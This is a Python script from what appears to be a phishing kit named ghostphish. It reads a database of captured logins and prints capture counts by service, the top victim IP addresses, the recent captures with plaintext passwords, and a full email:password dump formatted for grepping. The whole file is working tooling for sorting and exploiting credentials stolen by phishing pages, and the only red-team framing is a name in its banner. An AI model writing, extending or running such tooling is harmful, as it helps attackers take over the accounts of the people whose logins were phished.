#!/usr/bin/env python3
"""
ghostphish — capture statistics dashboard
Usage:  python3 stats.py
"""
import sqlite3
import os
import sys
from collections import Counter
from datetime import datetime

DB_PATH = os.path.join(os.path.dirname(__file__), "data", "captures.db")

# ANSI colors
R = "\033[0;31m"
G = "\033[0;32m"
Y = "\033[1;33m"
C = "\033[0;36m"
W = "\033[1;37m"
D = "\033[2m"
N = "\033[0m"


def main() -> int:
    if not os.path.exists(DB_PATH):
        print(f"{R}[!] Database not found at {DB_PATH}{N}")
        print(f"{Y}[+] Start ghostphish first: docker-compose up -d{N}")
        return 1

    db = sqlite3.connect(DB_PATH)
    c = db.cursor()
    c.execute("SELECT service, email, password, ip_address, timestamp FROM captures")
    rows = c.fetchall()

    if not rows:
        print(f"{Y}[i] No captures yet.{N}")
        return 0

    print(f"\n{R}╔══════════════════════════════════════════════════════╗{N}")
    print(f"{R}║        ghostphish — CAPTURE STATISTICS               ║{N}")
    print(f"{R}║        Developed by {W}Yaman.RedTeam{R}                    ║{N}")
    print(f"{R}╚══════════════════════════════════════════════════════╝{N}\n")

    total = len(rows)
    u_email = len({r[1] for r in rows})
    u_pw = len({r[2] for r in rows})
    u_ip = len({r[3] for r in rows})

    print(f"{W}  Total captures:{N}   {G}{total}{N}")
    print(f"{W}  Unique emails:{N}    {G}{u_email}{N}")
    print(f"{W}  Unique passwords:{N} {G}{u_pw}{N}")
    print(f"{W}  Unique IPs:{N}       {G}{u_ip}{N}\n")

    # By service
    print(f"{Y}  ── Captures by service ─────────────────────{N}")
    services = Counter(r[0] for r in rows)
    maxlen = max(len(s) for s in services)
    for svc, cnt in services.most_common():
        bar = "█" * cnt
        print(f"  {svc:<{maxlen + 2}} {G}{bar}{N} {cnt}")
    print()

    # By IP
    print(f"{Y}  ── Top IPs ────────────────────────────────{N}")
    ips = Counter(r[3] for r in rows)
    for ip, cnt in ips.most_common(5):
        is_private = (
            ip.startswith("127.")
            or ip.startswith("10.")
            or ip.startswith("172.")
            or ip.startswith("192.168.")
        )
        tag = f" {C}(public){N}" if not is_private else ""
        print(f"  {ip:<20s} {G}{cnt}{N}{tag}")
    print()

    # Recent activity — with credentials
    print(f"{Y}  ── Recent captures (last 10) ─────────────────────────────────{N}")
    print(f"  {W}{'time':<11s} {'service':<10s} {'email':<28s} {'password':<20s} {'IP'}{N}")
    print(f"  {D}{'-'*11} {'-'*10} {'-'*28} {'-'*20} {'-'*15}{N}")
    c.execute(
        "SELECT timestamp, service, email, password, ip_address "
        "FROM captures ORDER BY id DESC LIMIT 10"
    )
    for ts, svc, em, pw, ip in c.fetchall():
        t = datetime.fromisoformat(ts).strftime("%m-%d %H:%M")
        em_disp = (em[:26] + "..") if len(em) > 28 else em
        pw_disp = (pw[:18] + "..") if len(pw) > 20 else pw
        print(
            f"  {C}{t:<11s}{N} {W}{svc:<10s}{N} "
            f"{Y}{em_disp:<28s}{N} {G}{pw_disp:<20s}{N} {D}{ip}{N}"
        )
    print()

    # All credentials dump (email:password format — grep-friendly)
    print(f"{Y}  ── All credentials (email:password) ──────────{N}")
    c.execute("SELECT service, email, password FROM captures ORDER BY id DESC")
    for svc, em, pw in c.fetchall():
        print(f"  {W}[{svc:<10s}]{N} {Y}{em}{N}:{G}{pw}{N}")
    print()

    # Time range
    c.execute("SELECT MIN(timestamp), MAX(timestamp) FROM captures")
    first, last = c.fetchone()
    print(f"{Y}  ── Period ──────────────────────────────────{N}")
    print(f"  First: {first}")
    print(f"  Last:  {last}\n")

    # Password patterns
    pw_lens = [len(r[2]) for r in rows if r[2]]
    if pw_lens:
        print(f"{Y}  ── Password stats ─────────────────────────{N}")
        print(f"  Avg length: {sum(pw_lens) / len(pw_lens):.1f} chars")
        print(f"  Shortest:   {min(pw_lens)} chars")
        print(f"  Longest:    {max(pw_lens)} chars")

    db.close()
    print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
